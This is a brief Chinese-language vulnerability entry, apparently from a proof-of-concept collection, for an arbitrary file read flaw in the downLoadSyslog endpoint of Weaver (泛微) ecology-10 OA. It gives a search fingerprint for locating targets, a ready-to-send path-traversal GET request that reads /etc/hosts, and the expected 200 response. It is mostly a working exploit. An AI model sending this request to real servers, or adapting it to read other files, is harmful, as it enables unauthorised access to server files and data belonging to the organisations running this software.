# 泛微-ecology-10downLoadSyslog存在任意文件读取漏洞

泛微OA ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/build/passport/static/js/lib.js"`
- **请求**：`GET /papi/em/transform/downLoadSyslog?logPath=../../.././.././././../../etc/hosts HTTP/1.1`
- **响应特征**：200